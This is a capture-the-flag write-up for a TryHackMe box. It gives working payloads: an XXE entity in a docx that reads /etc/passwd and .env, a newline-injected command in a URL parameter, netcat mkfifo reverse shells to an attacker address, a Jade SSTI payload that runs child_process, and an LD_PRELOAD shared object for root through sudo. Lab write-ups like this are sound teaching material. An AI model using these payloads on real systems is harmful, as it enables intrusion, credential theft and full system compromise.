Back again with another gr8 Writeup for CTF organised by [@thexssrat](https://twitter.com/theXSSrat).

It was a Box Styled CTF hosted on Tryhackme.

![2.png](/img/ratctf/2.png)

This writeup will be divided into _ parts.

## Enumeration

Starting off with a nmap scan.

Only two ports standard 80 & 22.

## Foothold

Hopping on to port 80 greets us with a nice looking site with `register` `login` `upload` .

![4.png](/img/ratctf/4.png)

So after tampering with `upload` trying to get smth(shell, lol) , Only docx and txt were allowed. Judging by the description of the task it had some reference to `XXE` and `XSS` . So I thought of going with XXE with docx file by editing the `document.xml` ( as it contains the main text data for the document ) inside of docx file. As a docx file is simply a lot of `xml` files zipped together

Creating a docx using this snippet.

```python
from docx import Document
doc = Document()
para = doc.add_paragraph('Hello World')
doc.save('test.docx')
```

Unzipping the doc and editing the document.xml for XXE.

Adding the following doctype.

`<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>` and replacing the body element with `test` and zipping it again will give us the malicious docx.

Now here it is our passwd file. Now as the nmap scan shows us that it is NodeJs , so it has an important file called `.env` that has some juicy info regarding the application.

Now again modifying the docx to view `.env` (usr/src/app/.env) [After a lil hit & trial]

![6.png](/img/ractf/6.png)

Now there we have our Flag 1 with some creds which were not useful

The webapp also used JWT as its auth mechanism, so it was obvious to modify the JWT with the secret to become admin. Changing is_admin to 1 works.

![7.png](/img/ratctf/7.png)

After admin a new button appears to delete a file. Hmmmmmm.

![8.png](/img/ratctf/8.png)

After poking the delete functionality the authors released a hint saying about blind param injection.

and after a while 

```python
http://[BOX-IP]/delete?file=test.docx%0A(cd+/usr%0Acd+src%0Acd+app%0Acd+upload%0Ash+rev.txt)
```

and the `rev.txt` file had

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-IP] 12345 >/tmp/f
```

And we were in after a long hassle with command injection.

For this hassle we got our 2nd flag

`Rats make tunnels...`

## Pivot

Now as we were in docker env there wasn't much to do than to escape it. Then admin released another hint regarding to scan other hosts in the network.

But the box did'nt have any tool to do so, transferred the nmap binary onto the box (by using the webapps upload feature and adding the .txt extension to binary ,it was successfully uploaded) and then executing it on the box gave us the hosts.

It had a host `(172.20.0.1)` on which port `3000`  was open.

```bash
Host is up (-0.18s latency).
PORT     STATE SERVICE
3000/tcp open  unknown
MAC Address: 02:42:61:29:8C:65 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
```

I then upgraded my revshell to meterpreter so that I could forward the port 3000 onto my local machine for ease.

Hopping over to `6767` gave this.

![10.png](/img/ratctf/10.png)

Now again after blindly bashing in the payloads , admin again released another hint regarding SSTI. From this point of time it was somewhat clear what to do.

As it was using NodeJs, `Jade` was the main thing to look for.

Portswigger has this awesome blogpost for SSTI.

```jsx
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.0.2 9999 >/tmp/f')
```

and yay!!! we had another reverse shell and another flag too ie. flag 3

`Have you accepted cheeses into your life?`

## Priv-esc

Now for the last flag we had to privesc to root.

Trying several things, this was the main ðŸ™‚

```jsx
Matching Defaults entries for xss on ratbox:
    env_reset, env_keep+=LD_PRELOAD

User xss may run the following commands on ratbox:
    (root) NOPASSWD: /bin/ls /opt/docker/machines/rat/ratapp/upload/
xss@ratbox:~$
```

Now it was just a matter of minutes to get root.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

saving this and compiling with 

`gcc -fPIC -shared -o [shell.so](http://shell.so/) shell.c -nostartfiles`

and running the allowed command as

`sudo LD_PRELOAD=/tmp/shell.so /bin/ls /opt/docker/machines/rat/ratapp/upload/`

ROOT!!!!!!!!!!!

`/root/flag.txt` had

But this is'nt the flag whattttt!!!.

The actual flag was `.flag.txt`

`I knew you really curd!`
